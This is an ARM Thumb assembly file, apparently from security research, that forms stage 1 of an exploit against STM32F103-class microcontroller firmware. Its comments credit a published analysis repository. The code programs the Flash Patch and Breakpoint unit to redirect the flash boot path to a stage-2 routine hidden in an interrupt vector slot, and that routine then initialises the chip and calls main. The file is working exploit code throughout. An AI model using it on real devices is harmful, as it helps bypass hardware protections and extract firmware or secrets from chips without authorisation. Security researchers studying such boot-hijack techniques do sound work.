
/* 
 * Stage 1 of the exploit target firmware
 * This is the entry point for the exploit which will
 * set up the FPB to hijack the flash boot to jump to
 * stage 2
 * 
 * This part has been left unmodified from the original
 * firmware, which can be found here:
 * https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 */

.global _start
.syntax divided
.thumb

.section .isr_vector
isrVectors:
	.word 0x20005000
	.word _start+1
	.word vecNMI+1
	.word vecHardfault+1
	.word vecMemMan+1
	.word 0
	.word 0
	.word 0
/* These is the stage 2 entry point */
	.word stage2+1

.section .entryVec
	b _start

.section .text
.thumb
_start: /* stage 1 */
	ldr r0, =0xe0002000
        movs r1, #3                                                                                  
        movs r3, #0x05                                                                                  
        movs r2, #0x20                                                                               
        stm r0!, {r1, r2, r3}                                                                      
sinfl:  b sinfl


stage2:	
	/* Update the FPB */
	ldr r0, =0xe0002000
        movs r1, #3                                                                                  
        movs r3, #0x05                                                                                  
        movs r2, #0x20                                                                               
        stm r0!, {r1, r2, r3}                                                                      
	
	/* Set stack pointer */
	ldr r0, =isrVectors
	ldr r0, [r0]
	mov sp, r0

	cpsie if
	
	/* Configure VTOR */
	ldr r0, =0xe000ED08
	ldr r1, =isrVectors
	str r1, [r0]

	ldr r0, =_bss_end
	ldr r1, =_bss_start
	mov r3, #0

clrloop:strd r3, r3, [r1]
	add r1, r1, #8
	cmp r1, r0
	bne clrloop

	bl main

	infloop:
	b infloop


.section .text
vecNMI:
vecHardfault:
vecMemMan:
	mrs r0, IPSR
	b alertCrash

.section .data
.word 0x12345678

errVect:
	.word 0x00000000
